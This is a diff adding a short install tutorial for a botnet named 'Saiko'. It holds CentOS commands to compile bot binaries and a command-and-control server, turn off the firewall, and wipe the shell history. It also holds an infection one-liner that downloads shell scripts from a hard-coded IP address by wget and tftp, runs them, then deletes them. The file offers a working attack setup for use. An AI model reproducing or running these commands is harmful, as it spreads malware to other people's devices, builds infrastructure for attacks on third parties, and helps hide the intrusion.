@@ -1,0 +1,21 @@
+Centos 6 Install Tutorial
+Load all files into root dir on host
+
+Run: yum update -y; yum install wget python python-paramiko gcc nano screen httpd php bzip2 -y; service httpd start; echo -e "ulimit -n 99999" >> ~/.bashrc; nano /usr/include/bits/typesizes.h
+
+Scroll down to FDS and Change 1024 to 100000
+
+*CHANGE IP and BOTPORT in main.c (int hacks)
+
+(Replace HOSTIP and BINSPREFIX in this command then run it): chmod 777 *; gcc sy/*.c -o bp -pthread; rm -rf  bp; python Saiko.py fff 161.35.152.233 jsdfg; rm -rf sy; mv iplookup.php /var/www/html
+
+* CHANGE API Host in Saiko.c (Line 34)
+
+(Replace CNCPORT and BOTPORT in this command then run it): chmod 777 *; gcc -o c2 Saiko.c -pthread; rm -rf Saiko.c; iptables -F; service iptables stop; screen ./c2 1024 4554; rm -rf Saiko.py; history -c; rm -rf cross-compiler-*
+
+cd /tmp || cd /run || cd /; wget http://161.35.152.233/jsdfgbins.sh; chmod 777 jsdfgbins.sh; sh jsdfgbins.sh; tftp 161.35.152.233 -c get jsdfgtftp1.sh; chmod 777 jsdfgtftp1.sh; sh jsdfgtftp1.sh; tftp -r jsdfgtftp2.sh -g 161.35.152.233; chmod 777 jsdfgtftp2.sh; sh jsdfgtftp2.sh; rm -rf jsdfgbins.sh jsdfgtftp1.sh jsdfgtftp2.sh; rm -rf *
+
+
+161.35.152.233
+
+209.126.64.110
